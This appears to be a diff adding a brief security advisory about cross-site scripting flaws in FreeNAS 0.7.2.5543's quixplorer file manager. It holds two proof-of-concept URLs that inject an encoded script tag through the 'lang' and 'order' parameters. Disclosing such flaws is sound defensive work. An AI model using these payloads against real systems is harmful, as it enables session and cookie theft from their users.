@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/45522/info
+
+FreeNAS is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+FreeNAS 0.7.2.5543 is vulnerable; other versions may also be affected.
+
+http://www.example.com/quixplorer/index.php?action=list&order=name&srt=yes&lang=en%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E
+
+
+http://www.example.com/quixplorer/index.php?action=list&order=nan%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3Eme&srt=yes 
